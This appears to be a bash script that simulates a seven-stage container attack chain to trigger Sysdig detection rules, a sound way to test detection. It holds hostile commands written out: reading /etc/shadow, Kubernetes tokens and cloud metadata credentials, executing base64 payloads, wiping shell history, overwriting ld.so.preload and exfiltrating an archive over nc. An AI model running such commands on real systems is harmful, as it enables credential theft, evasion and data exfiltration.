#!/bin/bash

# Simulated attack chain: Initial Access → Discovery → Credential Access →
# Lateral Movement → C2 → Exfiltration → Defence Evasion
# Each step sleeps briefly so Sysdig captures distinct events.

log() {
    echo -e "$(date +"%Y-%m-%d %H:%M:%S") \e[92m[ATTACK-CHAIN] $1\033[m"
}

sleep_step() {
    sleep "${1:-3}"
}

# ── Stage 1: Initial Access ──────────────────────────────────────────────────
log "Stage 1/7 | Initial Access - Base64-encoded payload delivered via curl"
# IAM credentials path triggers "Contact EC2 Instance Metadata Service From Container"
curl -m2 -s -o /dev/null "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null || true
# Proper base64 decode triggers "Base64-encoded Binary Content" / python exec rules
python3 -c "import base64; exec(base64.b64decode('aW1wb3J0IG9z').decode())" 2>/dev/null || true
sleep_step 3

# ── Stage 2: Discovery ───────────────────────────────────────────────────────
log "Stage 2/7 | Discovery - Enumerating environment and SUID binaries"
find / -perm -4000 -type f ! -path "/dev/*" 2>/dev/null | head -20 || true
cat /proc/$$/maps > /tmp/.mem_recon 2>/dev/null || true
cat /etc/passwd > /dev/null 2>/dev/null || true
cat /etc/hostname > /dev/null 2>/dev/null || true
sleep_step 3

# ── Stage 3: Credential Access ───────────────────────────────────────────────
log "Stage 3/7 | Credential Access - Reading sensitive files and K8s tokens"
cat /etc/shadow > /tmp/.shadow_dump 2>/dev/null || true
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null 2>/dev/null || true
find /root -name "id_rsa" 2>/dev/null || true
find / -name "*.pem" -o -name "*.key" 2>/dev/null | head -10 || true
sleep_step 3

# ── Stage 4: Privilege Escalation / Persistence ──────────────────────────────
log "Stage 4/7 | Persistence - Modifying ld.so.preload and binary dirs"
echo '' > /etc/ld.so.preload 2>/dev/null || true
touch /usr/local/bin/.hidden_backdoor 2>/dev/null || true
ln -sf /etc/shadow /tmp/.symlink_shadow 2>/dev/null || true
sleep_step 3

# ── Stage 5: Defence Evasion ─────────────────────────────────────────────────
log "Stage 5/7 | Defence Evasion - Disabling watchdog, clearing logs"
sysctl kernel.nmi_watchdog=0 2>/dev/null || true
# rm/shred on history file triggers "Delete or rename shell history" (truncation does not)
touch ~/.bash_history 2>/dev/null || true
rm -f ~/.bash_history 2>/dev/null || true
shred -u /root/.bash_history 2>/dev/null || true
shred -u /tmp/.shadow_dump 2>/dev/null || true
shred -u /tmp/.mem_recon 2>/dev/null || true
ln -sf /dev/null /tmp/.bash_log 2>/dev/null || true
sleep_step 3

# ── Stage 6: C2 Beaconing ────────────────────────────────────────────────────
log "Stage 6/7 | C2 Beaconing - Contacting known malicious domains and metadata service"
# curl with stratum+tcp:// in cmdline triggers "Detect crypto miners using the Stratum protocol"
curl -m2 -s "stratum+tcp://xmr.pool.minergate.com:45700" > /dev/null 2>/dev/null || true
curl -m2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
    > /dev/null 2>/dev/null || true
export NS=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | head -1)
php -r '$ip=getenv("NS");$sock=@fsockopen($ip,53);' 2>/dev/null || true
sleep_step 3

# ── Stage 7: Exfiltration ────────────────────────────────────────────────────
log "Stage 7/7 | Exfiltration - Staging data and using network relay"
tar czf /tmp/.exfil_bundle.tar.gz /etc/passwd /etc/hostname 2>/dev/null || true
# Pipe data through nc to trigger "Network Relay Binary Exfiltration Activities Detected"
nc -w2 -q0 sysdig.com 80 < /tmp/.exfil_bundle.tar.gz > /dev/null 2>/dev/null || true
rm -f /tmp/.exfil_bundle.tar.gz /tmp/.symlink_shadow \
       /tmp/.bash_log /usr/local/bin/.hidden_backdoor 2>/dev/null || true

log "Attack chain complete - all 7 stages executed"
